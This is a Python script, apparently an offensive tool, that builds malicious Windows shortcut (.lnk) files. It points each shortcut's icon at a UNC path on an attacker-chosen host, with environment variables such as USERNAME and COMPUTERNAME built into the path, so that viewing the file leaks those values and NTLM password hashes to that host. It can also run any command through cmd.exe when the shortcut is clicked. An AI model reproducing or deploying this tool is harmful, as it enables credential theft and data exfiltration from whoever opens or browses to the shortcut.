import os
import argparse
import random
import sys

from datetime import datetime

# Check if we're running windows
is_windows = sys.platform.startswith('win')

if is_windows:
    import win32com.client
else:
    try:
       import pylnk
    except ImportError:
        print("You must install liblnk's python bindings for non-windows machines!")
        sys.exit(1)
banner_file = open("banner.txt")
banner = banner_file.read()
banner_file.close()
print(banner)

parser = argparse.ArgumentParser(description='Generate a LNK payload')
parser.add_argument('--host', metavar='h', type=str, nargs=1, required=True,
                help='Where should we send our data?')
parser.add_argument('--output', metavar='o', type=str, nargs=1, required=True,
                help="The name of the lnk file")
parser.add_argument('--execute', metavar='e', type=str, nargs=1, default=None,
                help="What command should we execute when the shortcut is clicked?"
                      + "\nDefault: None")
parser.add_argument('--vars', metavar='r', type=str, nargs=1,
                help="What variables should we exfiltrate?"
                     + "\nExample: \"PATH,COMPUTERNAME,USERNAME,NUMBER_OF_PROCESSORS\"")
parser.add_argument('--type', metavar='t', type=str, nargs=1, default=["all"],
               help='The payload type to generate. Possible options: '
                    + "\n* environment - Will exfiltrate specified environment variables"
                    + "\n* ntlm - Will exfiltrate windows NTLM password hashes"
                    + "\n* all (default) - Will exfiltrate everything we can")
args = parser.parse_args()
type = args.type[0].lower()
def run():
    path = ""
    target = "C:\\Windows\\System32\\explorer.exe .";
    icon = "";
    if args.execute != None:
        args.execute = args.execute[0].split(" ")
        target = ' '.join(args.execute)
    if type == "all" or type == "environment":
        if args.vars == None:
            print("You must specify environment variables to exfiltrate using --vars")
            print("Alternatively, use another payload type with --type")
            return
        args.vars = args.vars[0].replace("%", "").split(" ")
        path = '\\'.join("%{0}%".format(w) for w in args.vars)
                                                                    # Some minor anti-caching
        icon = "\\\\" + args.host[0] + "\\Share\\" + path + "\\" + str(random.randint(0, 50000)) + ".ico"
    elif type == "ntlm":
        icon = "\\\\" + args.host[0] + "\\Share\\" + str(random.randint(0, 50000)) + ".ico"
    else:
        print("Invalid type given.")
        print("Valid types are:")
        print("- environment")
        print("- ntlm")
        print("- all")
        return
    if is_windows:
        ws = win32com.client.Dispatch("wscript.shell")
        link = ws.CreateShortcut(args.output[0])
        link.Targetpath = "C:\\Windows\\System32\\cmd.exe"
        link.Arguments = "/c " + target
        link.IconLocation = icon
        link.save()
    else:
        filepath = os.getcwd() + "/" + (args.output[0])
        
        link = for_file("C:\\Windows\\System32\\cmd.exe", filepath)
        #if not pylnk.check_file_signature(link):
        #    print("Oh no! The Template.lnk file has been corrupted! Please try redownloading it!")
        #    return
        link.arguments  = "/c " + target
        link.target = target
        link.icon = icon

        print("File saved to {}".format(filepath))
        link.save(filepath)
    
    print("Link created at {} with UNC path {}.".format(args.output[0], icon))

"""
   These functions are helper functions from pylnk that assumed the lnk file was 
   for the same OS it was being created on. For our purposes, our target is windows
   only, so I've adjusted them to assume a windows target to avoid errors.
"""
def for_file(target_file, lnk_name=None):
    lnk = pylnk.create(lnk_name)
        
    levels = list(target_file.split("\\"))
    elements = [levels[0]]
    for level in levels[1:-1]:
        segment = create_for_path(level, True)
        elements.append(segment)
    segment = create_for_path(levels[-1], False)
    elements.append(segment)
    lnk.shell_item_id_list = pylnk.LinkTargetIDList()
    lnk.shell_item_id_list.items = elements
    return pylnk.from_segment_list(elements, lnk_name)

def create_for_path(path, isdir):
    entry = {}
    entry['type'] = pylnk.TYPE_FOLDER if isdir else pylnk.TYPE_FILE
    entry['size'] = 272896 
    entry['created'] = datetime.now()
    entry['accessed'] = datetime.now()
    entry['modified'] = datetime.now()
    entry['name'] = path.split("\\")[0]
    return entry

run()